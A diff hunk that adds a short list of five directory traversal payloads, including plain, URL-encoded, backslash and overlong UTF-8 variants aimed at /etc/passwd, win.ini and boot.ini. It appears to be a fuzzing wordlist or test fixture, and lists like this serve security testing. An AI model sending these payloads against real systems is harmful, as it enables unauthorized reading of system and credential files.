@@ -1,0 +1,6 @@
+../../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+..\\..\\..\\windows\\win.ini
+../../../../../../boot.ini
+..%c0%af..%c0%afetc%c0%afpasswd
+
